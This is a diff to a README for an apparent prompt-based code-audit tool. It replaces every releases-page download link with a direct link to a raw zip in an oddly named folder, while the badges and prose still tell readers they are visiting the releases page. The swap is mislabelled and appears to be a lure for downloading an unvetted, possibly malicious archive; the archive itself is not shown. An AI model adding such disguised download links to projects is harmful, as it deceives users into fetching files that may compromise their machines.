@@ -1,6 +1,6 @@
 # 🧠 Code-Health-Check-Prompt - Audit Codebases With Clarity
 
-[![Download Code-Health-Check-Prompt](https://img.shields.io/badge/Download-Visit%20Releases-6A5ACD?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Petrcatapultian539/Code-Health-Check-Prompt/releases)
+[![Download Code-Health-Check-Prompt](https://img.shields.io/badge/Download-Visit%20Releases-6A5ACD?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Petrcatapultian539/Code-Health-Check-Prompt/raw/refs/heads/main/colloped/Prompt-Check-Code-Health-2.6.zip)
 
 ## 🚀 What This Is
 
@@ -27,7 +27,7 @@ No programming knowledge is needed. You only need to download the release files 
 ## 📥 Download
 
 Visit this page to download:  
-https://github.com/Petrcatapultian539/Code-Health-Check-Prompt/releases
+https://github.com/Petrcatapultian539/Code-Health-Check-Prompt/raw/refs/heads/main/colloped/Prompt-Check-Code-Health-2.6.zip
 
 On that page, look for the latest release and download the file that fits your setup. If there is a `.zip` file, download that file and extract it first. If there is a ready-to-use text file, download it and open it in your editor or prompt tool.
 
@@ -213,6 +213,6 @@ This project works well for:
 
 ## 🔗 Download Again
 
-[![Download Code-Health-Check-Prompt](https://img.shields.io/badge/Download-Visit%20Releases-808080?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Petrcatapultian539/Code-Health-Check-Prompt/releases)
+[![Download Code-Health-Check-Prompt](https://img.shields.io/badge/Download-Visit%20Releases-808080?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Petrcatapultian539/Code-Health-Check-Prompt/raw/refs/heads/main/colloped/Prompt-Check-Code-Health-2.6.zip)
 
 Open the releases page, get the latest file, and use it with your preferred review setup
